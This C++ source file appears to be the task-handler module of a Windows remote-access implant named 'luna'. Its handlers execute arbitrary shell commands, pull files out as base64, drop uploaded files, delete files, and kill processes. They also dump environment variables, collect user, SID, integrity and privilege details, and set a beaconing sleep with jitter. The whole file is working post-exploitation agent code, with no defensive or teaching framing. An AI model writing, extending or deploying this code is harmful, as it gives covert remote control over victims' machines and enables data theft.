#include "modules.hpp"

#include "crypto.hpp"
#include "exec.hpp"
#include "platform.hpp"
#include "sysutil.hpp"

#include <tlhelp32.h>

#include <cstdio>
#include <vector>

namespace luna {

namespace {

constexpr std::size_t kMaxCatBytes = 1u * 1024u * 1024u;
constexpr std::size_t kMaxDownloadBytes = 24u * 1024u * 1024u;

std::string current_directory() {
    DWORD need = GetCurrentDirectoryW(0, nullptr);
    if (need == 0) return ".";
    std::wstring buf(need, L'\0');
    if (GetCurrentDirectoryW(need, buf.data()) == 0) return ".";
    while (!buf.empty() && buf.back() == L'\0') buf.pop_back();
    return to_utf8(buf);
}

Result fail(const std::string& message) {
    Result r;
    r.ok = false;
    r.err = message;
    return r;
}

Result success(std::string data) {
    Result r;
    r.ok = true;
    r.data = std::move(data);
    return r;
}

bool read_file(const std::string& path, Bytes& out, std::size_t cap, std::string& err) {
    HANDLE file = CreateFileW(to_wide(path).c_str(), GENERIC_READ,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                              nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        err = "cannot open " + path + ": " + last_error();
        return false;
    }
    LARGE_INTEGER size{};
    if (!GetFileSizeEx(file, &size)) {
        err = "cannot stat " + path + ": " + last_error();
        CloseHandle(file);
        return false;
    }
    if (size.QuadPart < 0 || static_cast<std::uint64_t>(size.QuadPart) > cap) {
        err = "file is " + std::to_string(size.QuadPart) + " bytes, exceeds limit of " +
              std::to_string(cap);
        CloseHandle(file);
        return false;
    }
    out.resize(static_cast<std::size_t>(size.QuadPart));
    std::size_t total = 0;
    while (total < out.size()) {
        DWORD got = 0;
        const DWORD want = static_cast<DWORD>(
            (out.size() - total) > 0x100000 ? 0x100000 : (out.size() - total));
        if (!ReadFile(file, out.data() + total, want, &got, nullptr)) {
            err = "read failed for " + path + ": " + last_error();
            CloseHandle(file);
            return false;
        }
        if (got == 0) break;
        total += got;
    }
    out.resize(total);
    CloseHandle(file);
    return true;
}

}  // namespace

Result handle_shell(const Json& args, AgentState& /*state*/) {
    const std::string cmd = args["cmd"].as_string();
    if (cmd.empty()) return fail("no command supplied");
    DWORD timeout = 120000;
    if (args.has("timeout")) {
        const auto t = args["timeout"].as_int(120);
        if (t > 0) timeout = static_cast<DWORD>(t * 1000);
    }
    const ExecResult r = run_shell(cmd, timeout);
    if (!r.started) return fail("spawn failed: " + r.error);
    Result out;
    out.ok = !r.timed_out;
    out.data = r.output;
    out.err = r.timed_out ? "command timed out" : "";
    if (!out.err.empty() && !out.data.empty()) out.data += "\n" + out.err;
    return out;
}

Result handle_pwd(const Json& /*args*/, AgentState& state) {
    state.cwd = current_directory();
    return success(state.cwd);
}

Result handle_cd(const Json& args, AgentState& state) {
    const std::string path = args["path"].as_string();
    if (path.empty()) return fail("no path supplied");
    const std::wstring wide = to_wide(path);
    if (!SetCurrentDirectoryW(wide.c_str())) {
        return fail("cannot enter " + path + ": " + last_error());
    }
    state.cwd = current_directory();
    return success(state.cwd);
}

Result handle_ls(const Json& args, AgentState& state) {
    std::string path = args["path"].as_string();
    if (path.empty()) path = state.cwd.empty() ? current_directory() : state.cwd;
    state.cwd = path;

    Json entries = Json::array();
    const std::wstring pattern = to_wide(join_path(path, "*"));

    WIN32_FIND_DATAW data{};
    HANDLE find = FindFirstFileExW(pattern.c_str(), FindExInfoBasic, &data,
                                   FindExSearchNameMatch, nullptr,
                                   FIND_FIRST_EX_LARGE_FETCH);
    if (find == INVALID_HANDLE_VALUE) {
        return fail("cannot list " + path + ": " + last_error());
    }
    do {
        const std::wstring name = data.cFileName;
        if (name == L"." || name == L"..") continue;
        Json entry = Json::object();
        entry.set("name", Json(to_utf8(name)));
        const bool is_dir = (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        entry.set("dir", Json(is_dir));
        ULARGE_INTEGER size{};
        size.LowPart = data.nFileSizeLow;
        size.HighPart = data.nFileSizeHigh;
        entry.set("size", Json(static_cast<std::int64_t>(size.QuadPart)));
        entry.set("mtime", Json(static_cast<std::int64_t>(file_time_to_unix(data.ftLastWriteTime))));
        entries.push(std::move(entry));
    } while (FindNextFileW(find, &data));
    FindClose(find);

    Json out = Json::object();
    out.set("path", Json(path));
    out.set("entries", std::move(entries));
    return success(out.dump());
}

Result handle_cat(const Json& args, AgentState& /*state*/) {
    const std::string path = args["path"].as_string();
    if (path.empty()) return fail("no path supplied");
    Bytes data;
    std::string err;
    if (!read_file(path, data, kMaxCatBytes, err)) return fail(err);
    return success(std::string(data.begin(), data.end()));
}

Result handle_download(const Json& args, AgentState& /*state*/) {
    const std::string path = args["path"].as_string();
    if (path.empty()) return fail("no path supplied");
    Bytes data;
    std::string err;
    if (!read_file(path, data, kMaxDownloadBytes, err)) return fail(err);
    return success(b64_encode(data));
}

Result handle_upload(const Json& args, AgentState& /*state*/) {
    const std::string path = args["path"].as_string();
    const Bytes data = b64_decode(args["data"].as_string());
    if (path.empty()) return fail("no destination path supplied");
    HANDLE file = CreateFileW(to_wide(path).c_str(), GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        return fail("cannot write " + path + ": " + last_error());
    }
    std::size_t total = 0;
    bool bad = false;
    while (total < data.size()) {
        DWORD wrote = 0;
        const DWORD want = static_cast<DWORD>(
            (data.size() - total) > 0x100000 ? 0x100000 : (data.size() - total));
        if (!WriteFile(file, data.data() + total, want, &wrote, nullptr) || wrote == 0) {
            bad = true;
            break;
        }
        total += wrote;
    }
    CloseHandle(file);
    if (bad) return fail("write failed for " + path + ": " + last_error());
    return success("wrote " + std::to_string(total) + " bytes to " + path);
}

Result handle_rm(const Json& args, AgentState& /*state*/) {
    const std::string path = args["path"].as_string();
    if (path.empty()) return fail("no path supplied");
    const std::wstring wide = to_wide(path);
    const DWORD attr = GetFileAttributesW(wide.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) return fail("no such path: " + path);
    if (attr & FILE_ATTRIBUTE_DIRECTORY) {
        if (!RemoveDirectoryW(wide.c_str())) return fail("rmdir failed: " + last_error());
    } else {
        SetFileAttributesW(wide.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (!DeleteFileW(wide.c_str())) return fail("delete failed: " + last_error());
    }
    return success("removed " + path);
}

Result handle_mkdir(const Json& args, AgentState& /*state*/) {
    const std::string path = args["path"].as_string();
    if (path.empty()) return fail("no path supplied");
    if (!CreateDirectoryW(to_wide(path).c_str(), nullptr)) {
        return fail("mkdir failed: " + last_error());
    }
    return success("created " + path);
}

Result handle_ps(const Json& /*args*/, AgentState& /*state*/) {
    Json list = Json::array();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return fail("snapshot failed: " + last_error());

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snap, &entry)) {
        do {
            Json proc = Json::object();
            proc.set("pid", Json(static_cast<std::int64_t>(entry.th32ProcessID)));
            proc.set("ppid", Json(static_cast<std::int64_t>(entry.th32ParentProcessID)));
            proc.set("threads", Json(static_cast<std::int64_t>(entry.cntThreads)));
            proc.set("name", Json(to_utf8(entry.szExeFile)));
            list.push(std::move(proc));
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return success(list.dump());
}

Result handle_kill(const Json& args, AgentState& /*state*/) {
    const auto pid = args["pid"].as_int(0);
    if (pid <= 0) return fail("no pid supplied");
    HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, static_cast<DWORD>(pid));
    if (!proc) return fail("cannot open pid " + std::to_string(pid) + ": " + last_error());
    const BOOL ok = TerminateProcess(proc, 1);
    CloseHandle(proc);
    if (!ok) return fail("terminate failed: " + last_error());
    return success("terminated pid " + std::to_string(pid));
}

Result handle_env(const Json& /*args*/, AgentState& /*state*/) {
    LPWCH block = GetEnvironmentStringsW();
    if (!block) return fail("cannot read environment");
    std::string out;
    for (LPWCH it = block; *it; it += wcslen(it) + 1) {
        out += to_utf8(it);
        out += "\r\n";
    }
    FreeEnvironmentStringsW(block);
    return success(out);
}

Result handle_sysinfo(const Json& /*args*/, AgentState& /*state*/) {
    const TokenInfo info = token_info();
    SYSTEM_INFO si{};
    GetNativeSystemInfo(&si);

    MEMORYSTATUSEX mem{};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);

    wchar_t windows_dir[MAX_PATH * 2] = {};
    GetWindowsDirectoryW(windows_dir, MAX_PATH * 2);

    Json out = Json::object();
    out.set("hostname", Json(computer_name()));
    out.set("user", Json(info.user));
    out.set("sid", Json(info.sid));
    out.set("integrity", Json(info.integrity));
    out.set("elevated", Json(info.elevated));
    out.set("os", Json(os_version()));
    out.set("arch", Json(architecture()));
    out.set("processors", Json(static_cast<std::int64_t>(si.dwNumberOfProcessors)));
    out.set("page_size", Json(static_cast<std::int64_t>(si.dwPageSize)));
    out.set("memory_total_mb", Json(static_cast<std::int64_t>(mem.ullTotalPhys / (1024 * 1024))));
    out.set("memory_avail_mb", Json(static_cast<std::int64_t>(mem.ullAvailPhys / (1024 * 1024))));
    out.set("uptime_minutes", Json(static_cast<std::int64_t>(GetTickCount64() / 60000)));
    out.set("windows_dir", Json(to_utf8(windows_dir)));
    out.set("pid", Json(static_cast<std::int64_t>(GetCurrentProcessId())));
    out.set("cwd", Json(current_directory()));

    Json privs = Json::array();
    for (const auto& p : privileges()) privs.push(Json(p));
    out.set("privileges", std::move(privs));
    return success(out.dump());
}

Result handle_sleep(const Json& args, AgentState& state) {
    const auto seconds = args["seconds"].as_int(0);
    const auto jitter = args["jitter"].as_int(state.jitter_percent);
    if (seconds <= 0) return fail("seconds must be positive");
    state.sleep_seconds = static_cast<int>(seconds);
    state.jitter_percent = static_cast<int>(jitter < 0 ? 0 : (jitter > 90 ? 90 : jitter));
    return success("sleep=" + std::to_string(state.sleep_seconds) +
                   " jitter=" + std::to_string(state.jitter_percent));
}

Result handle_exit(const Json& /*args*/, AgentState& state) {
    state.shutdown_requested = true;
    return success("exiting");
}

Result handle_whoami(const Json& /*args*/, AgentState& /*state*/) {
    const TokenInfo info = token_info();
    std::string out = info.user + "\r\n";
    out += "sid: " + info.sid + "\r\n";
    out += "integrity: " + info.integrity + "\r\n";
    out += "elevated: " + std::string(info.elevated ? "yes" : "no") + "\r\n\r\n";
    for (const auto& p : privileges()) {
        out += p + "\r\n";
    }
    return success(out);
}

}  // namespace luna
